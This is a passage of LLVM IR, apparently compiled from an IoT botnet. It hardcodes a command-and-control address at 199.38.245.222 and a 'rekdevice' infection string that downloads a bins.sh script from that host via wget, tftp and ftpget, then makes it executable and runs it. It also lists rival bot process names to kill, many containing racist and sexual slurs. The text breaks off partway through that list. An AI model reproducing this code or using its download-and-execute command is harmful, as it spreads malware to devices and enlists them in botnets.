; ModuleID = 'llvm-link'
source_filename = "llvm-link"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.list = type { i8*, %struct.list*, %struct.list* }
%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.dns_hdr = type { i16, i16, i16, i16, i16, i16 }
%struct.query = type { i16, i16 }
%struct.ps_hdr = type { i32, i32, i8, i8, i16 }
%struct.thread_data = type { i32, i8*, i32, i32, i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@.str = private unnamed_addr constant [18 x i8] c"199.38.245.222:23\00", align 1
@cncServer = dso_local global [1 x i8*] [i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [477 x i8] c"cd /tmp || cd /home/$USER || cd /var/run || cd /dev/shm || cd /mnt || cd /var || cd /; wget http://199.38.245.222/bins.sh; busybox wget http://199.38.245.222/bins.sh; tftp -r bins.sh -g 199.38.245.222; busybox tftp -r bins.sh -g 199.38.245.222; ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 bins.sh bins.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 bins.sh bins.sh; chmod 777 bins.sh; busybox chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh\0D\0A\00\00", align 1
@rekdevice = dso_local global i8* getelementptr inbounds ([477 x i8], [477 x i8]* @.str.1, i32 0, i32 0), align 8
@.str.2 = private unnamed_addr constant [7 x i8] c"902i13\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"BzSxLxBxeY\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"HOHO-LUGO7\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"HOHO-U79OL\00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"JuYfouyf87\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"NiGGeR69xd\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"SO190Ij1X\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"LOLKIKEEEDDE\00", align 1
@.str.10 = private unnamed_addr constant [12 x i8] c"ekjheory98e\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"scansh4\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"MDMA\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"fdevalvex\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"scanspc\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"MELTEDNINJAREALZ\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"flexsonskids\00", align 1
@.str.17 = private unnamed_addr constant [8 x i8] c"scanx86\00", align 1
@.str.18 = private unnamed_addr constant [12 x i8] c"foAxi102kxe\00", align 1
@.str.19 = private unnamed_addr constant [13 x i8] c"swodjwodjwoj\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"MmKiy7f87l\00", align 1
@.str.21 = private unnamed_addr constant [14 x i8] c"freecookiex86\00", align 1
@.str.22 = private unnamed_addr constant [7 x i8] c"sysgpu\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c"frgege\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"sysbinsr\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"0DnAzepd\00", align 1
@.str.26 = private unnamed_addr constant [14 x i8] c"NiGGeRD0nks69\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"frgreu\00", align 1
@.str.28 = private unnamed_addr constant [8 x i8] c"telnetd\00", align 1
@.str.29 = private unnamed_addr constant [11 x i8] c"0x766f6964\00", align 1
@.str.30 = private unnamed_addr constant [16 x i8] c"NiGGeRd0nks1337\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"gaft\00", align 1
@.str.32 = private unnamed_addr constant [13 x i8] c"urasgbsigboa\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"120i3UI49\00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"OaF3\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"geae\00", align 1
@.str.36 = private unnamed_addr constant [9 x i8] c"vaiolmao\00", align 1
@.str.37 = private unnamed_addr constant [8 x i8] c"123123a\00", align 1
@.str.38 = private unnamed_addr constant [15 x i8] c"Ofurain0n4H34D\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"ggTrex\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"wasads\00", align 1
@.str.41 = private unnamed_addr constant [12 x i8] c"1293194hjXD\00", align 1
@.str.42 = private unnamed_addr constant [10 x i8] c"OthLaLosn\00", align 1
@.str.43 = private unnamed_addr constant [4 x i8] c"ggt\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"wget-log\00", align 1
@.str.45 = private unnamed_addr constant [15 x i8] c"1337SoraLOADER\00", align 1
@.str.46 = private unnamed_addr constant [9 x i8] c"SAIAKINA\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"ggtq\00", align 1
@.str.48 = private unnamed_addr constant [17 x i8] c"1378bfp919GRB1Q2\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"SAIAKUSO\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"ggtr\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"14Fa\00", align 1
@.str.52 = private unnamed_addr constant [13 x i8] c"SEXSLAVE1337\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"ggtt\00", align 1
@.str.54 = private unnamed_addr constant [15 x i8] c"1902a3u912u3u4\00", align 1
@.str.55 = private unnamed_addr constant [10 x i8] c"haetrghbr\00", align 1
@.str.56 = private unnamed_addr constant [7 x i8] c"19ju3d\00", align 1
@.str.57 = private unnamed_addr constant [12 x i8] c"SORAojkf120\00", align 1
@.str.58 = private unnamed_addr constant [13 x i8] c"hehahejeje92\00", align 1
@.str.59 = private unnamed_addr constant [14 x i8] c"2U2JDJA901F91\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"SlaVLav12\00", align 1
@.str.61 = private unnamed_addr constant [17 x i8] c"helpmedaddthhhhh\00", align 1
@.str.62 = private unnamed_addr constant [11 x i8] c"2wgg9qphbq\00", align 1
@.str.63 = private unnamed_addr constant [18 x i8] c"Slav3Th3seD3vices\00", align 1
@.str.64 = private unnamed_addr constant [11 x i8] c"hzSmYZjYMQ\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"5Gbf\00", align 1
@.str.66 = private unnamed_addr constant [13 x i8] c"SoRAxD123LOL\00", align 1
@.str.67 = private unnamed_addr constant [5 x i8] c"iaGv\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"5aA3\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"SoRAxD420LOL\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"insomni\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"640277\00", align 1
@.str.72 = private unnamed_addr constant [17 x i8] c"SoraBeReppin1337\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"ipcamCache\00", align 1
@.str.74 = private unnamed_addr constant [9 x i8] c"66tlGg9Q\00", align 1
@.str.75 = private unnamed_addr constant [2 x i8] c"T\00", align 1
@.str.76 = private unnamed_addr constant [11 x i8] c"jUYfouyf87\00", align 1
@.str.77 = private unnamed_addr constant [5 x i8] c"6ke3\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"TOKYO3\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"lyEeaXul2dULCVxh\00", align 1
@.str.80 = private unnamed_addr constant [10 x i8] c"93OfjHZ2z\00", align 1
@.str.81 = private unnamed_addr constant [17 x i8] c"TY2gD6MZvKc7KU6r\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"mMkiy6f87l\00", align 1
@.str.83 = private unnamed_addr constant [14 x i8] c"A023UU4U24UIU\00", align 1
@.str.84 = private unnamed_addr constant [10 x i8] c"TheWeeknd\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"mioribitches\00", align 1
@.str.86 = private unnamed_addr constant [5 x i8] c"A5p9\00", align 1
@.str.87 = private unnamed_addr constant [11 x i8] c"TheWeeknds\00", align 1
@.str.88 = private unnamed_addr constant [10 x i8] c"mnblkjpoi\00", align 1
@.str.89 = private unnamed_addr constant [5 x i8] c"AbAd\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"Tokyos\00", align 1
@.str.91 = private unnamed_addr constant [4 x i8] c"neb\00", align 1
@.str.92 = private unnamed_addr constant [6 x i8] c"Akiru\00", align 1
@.str.93 = private unnamed_addr constant [7 x i8] c"U8inTz\00", align 1
@.str.94 = private unnamed_addr constant [9 x i8] c"netstats\00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"Alex\00", align 1
@.str.96 = private unnamed_addr constant [11 x i8] c"W9RCAKM20T\00", align 1
@.str.97 = private unnamed_addr constant [11 x i8] c"newnetword\00", align 1
@.str.98 = private unnamed_addr constant [7 x i8] c"Ayo215\00", align 1
@.str.99 = private unnamed_addr constant [5 x i8] c"Word\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"nloads\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"BAdAsV\00", align 1
@.str.102 = private unnamed_addr constant [9 x i8] c"Wordmane\00", align 1
@.str.103 = private unnamed_addr constant [11 x i8] c"notyakuzaa\00", align 1
@.str.104 = private unnamed_addr constant [6 x i8] c"Belch\00", align 1
@.str.105 = private unnamed_addr constant [9 x i8] c"Wordnets\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"obp\00", align 1
@.str.107 = private unnamed_addr constant [13 x i8] c"BigN0gg0r420\00", align 1
@.str.108 = private unnamed_addr constant [10 x i8] c"X0102I34f\00", align 1
@.str.109 = private unnamed_addr constant [14 x i8] c"ofhasfhiafhoi\00", align 1
@.str.110 = private unnamed_addr constant [14 x i8] c"X19I239124UIU\00", align 1
@.str.111 = private unnamed_addr constant [5 x i8] c"oism\00", align 1
@.str.112 = private unnamed_addr constant [9 x i8] c"Deported\00", align 1
@.str.113 = private unnamed_addr constant [14 x i8] c"XSHJEHHEIIHWO\00", align 1
@.str.114 = private unnamed_addr constant [10 x i8] c"olsVNwo12\00", align 1
@.str.115 = private unnamed_addr constant [17 x i8] c"DeportedDeported\00", align 1
@.str.116 = private unnamed_addr constant [11 x i8] c"XkTer0GbA1\00", align 1
@.str.117 = private unnamed_addr constant [9 x i8] c"onry0v03\00", align 1
@.str.118 = private unnamed_addr constant [17 x i8] c"FortniteDownLOLZ\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"Y0urM0mGay\00", align 1
@.str.120 = private unnamed_addr constant [16 x i8] c"pussyfartlmaojk\00", align 1
@.str.121 = private unnamed_addr constant [15 x i8] c"GrAcEnIgGeRaNn\00", align 1
@.str.122 = private unnamed_addr constant [11 x i8] c"YvdGkqndCO\00", align 1
@.str.123 = private unnamed_addr constant [11 x i8] c"qGeoRBe6BE\00", align 1
@.str.124 = private unnamed_addr constant [12 x i8] c"GuiltyCrown\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"ZEuS69\00", align 1
@.str.126 = private unnamed_addr constant [11 x i8] c"s4beBsEQhd\00", align 1
@.str.127 = private unnamed_addr constant [11 x i8] c"HOHO-KSNDO\00", align 1
@.str.128 = private unnamed_addr constant [7 x i8] c"ZEuz69\00", align 1
@.str.129 = private unnamed_addr constant [8 x i8] c"sat1234\00", align 1
@.str.130 = private unnamed_addr constant [9 x i8] c"aj93hJ23\00", align 1
@.str.131 = private unnamed_addr constant [7 x i8] c"scanHA\00", align 1
@.str.132 = private unnamed_addr constant [13 x i8] c"alie293z0k2L\00", align 1
@.str.133 = private unnamed_addr constant [13 x i8] c"scanJoshoARM\00", align 1
@.str.134 = private unnamed_addr constant [11 x i8] c"HellInSide\00", align 1
@.str.135 = private unnamed_addr constant [13 x i8] c"ayyyGangShit\00", align 1
@.str.136 = private unnamed_addr constant [14 x i8] c"scanJoshoARM5\00", align 1
@.str.137 = private unnamed_addr constant [8 x i8] c"HighFry\00", align 1
@.str.138 = private unnamed_addr constant [5 x i8] c"b1gl\00", align 1
@.str.139 = private unnamed_addr constant [14 x i8] c"scanJoshoARM6\00", align 1
@.str.140 = private unnamed_addr constant [11 x i8] c"IWhPyucDbJ\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"boatnetz\00", align 1
@.str.142 = private unnamed_addr constant [14 x i8] c"scanJoshoARM7\00", align 1
@.str.143 = private unnamed_addr constant [11 x i8] c"IuYgujeIqn\00", align 1
@.str.144 = private unnamed_addr constant [10 x i8] c"btbatrtah\00", align 1
@.str.145 = private unnamed_addr constant [14 x i8] c"scanJoshoM68K\00", align 1
@.str.146 = private unnamed_addr constant [13 x i8] c"JJDUHEWBBBIB\00", align 1
@.str.147 = private unnamed_addr constant [2 x i8] c"c\00", align 1
@.str.148 = private unnamed_addr constant [14 x i8] c"scanJoshoMIPS\00", align 1
@.str.149 = private unnamed_addr constant [14 x i8] c"JSDGIEVIVAVIG\00", align 1
@.str.150 = private unnamed_addr constant [11 x i8] c"cKbVkzGOPa\00", align 1
@.str.151 = private unnamed_addr constant [14 x i8] c"scanJoshoMPSL\00", align 1
@.str.152 = private unnamed_addr constant [5 x i8] c"ccAD\00", align 1
@.str.153 = private unnamed_addr constant [13 x i8] c"scanJoshoPPC\00", align 1
@.str.154 = private unnamed_addr constant [12 x i8] c"KAZEN-OIU97\00", align 1
@.str.155 = private unnamed_addr constant [13 x i8] c"chickenxings\00", align 1
@.str.156 = private unnamed_addr constant [13 x i8] c"scanJoshoSH4\00", align 1
@.str.157 = private unnamed_addr constant [10 x i8] c"yakuskzm8\00", align 1
@.str.158 = private unnamed_addr constant [12 x i8] c"KAZEN-PO78H\00", align 1
@.str.159 = private unnamed_addr constant [8 x i8] c"cleaner\00", align 1
@.str.160 = private unnamed_addr constant [13 x i8] c"scanJoshoSPC\00", align 1
@.str.161 = private unnamed_addr constant [10 x i8] c"yakuv4vxc\00", align 1
@.str.162 = private unnamed_addr constant [12 x i8] c"KAZEN-U79OL\00", align 1
@.str.163 = private unnamed_addr constant [6 x i8] c"dbeef\00", align 1
@.str.164 = private unnamed_addr constant [13 x i8] c"scanJoshoX86\00", align 1
@.str.165 = private unnamed_addr constant [10 x i8] c"yakuz4c24\00", align 1
@.str.166 = private unnamed_addr constant [10 x i8] c"KETASHI32\00", align 1
@.str.167 = private unnamed_addr constant [10 x i8] c"ddrwelper\00", align 1
@.str.168 = private unnamed_addr constant [9 x i8] c"scanarm5\00", align 1
@.str.169 = private unnamed_addr constant [11 x i8] c"zPnr6HpQj2\00", align 1
@.str.170 = private unnamed_addr constant [13 x i8] c"Kaishi-Iz90Y\00", align 1
@.str.171 = private unnamed_addr constant [7 x i8] c"deexec\00", align 1
@.str.172 = private unnamed_addr constant [9 x i8] c"scanarm6\00", align 1
@.str.173 = private unnamed_addr constant [10 x i8] c"zdrtfxcgy\00", align 1
@.str.174 = private unnamed_addr constant [10 x i8] c"Katrina32\00", align 1
@.str.175 = private unnamed_addr constant [9 x i8] c"doCP3fVj\00", align 1
@.str.176 = private unnamed_addr constant [9 x i8] c"scanarm7\00", align 1
@.str.177 = private unnamed_addr constant [9 x i8] c"zxcfhuio\00", align 1
@.str.178 = private unnamed_addr constant [11 x i8] c"Ksif91je39\00", align 1
@.str.179 = private unnamed_addr constant [9 x i8] c"scanm68k\00", align 1
@.str.180 = private unnamed_addr constant [6 x i8] c"Kuasa\00", align 1
@.str.181 = private unnamed_addr constant [10 x i8] c"dvrpelper\00", align 1
@.str.182 = private unnamed_addr constant [9 x i8] c"scanmips\00", align 1
@.str.183 = private unnamed_addr constant [14 x i8] c"KuasaBinsMate\00", align 1
@.str.184 = private unnamed_addr constant [11 x i8] c"eQnOhRk85r\00", align 1
@.str.185 = private unnamed_addr constant [9 x i8] c"scanmpsl\00", align 1
@.str.186 = private unnamed_addr constant [14 x i8] c"LOLHHHOHOHBUI\00", align 1
@.str.187 = private unnamed_addr constant [11 x i8] c"eXK20CL12Z\00", align 1
@.str.188 = private unnamed_addr constant [8 x i8] c"scanppc\00", align 1
@knownBots = dso_local global [193 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.131, i32 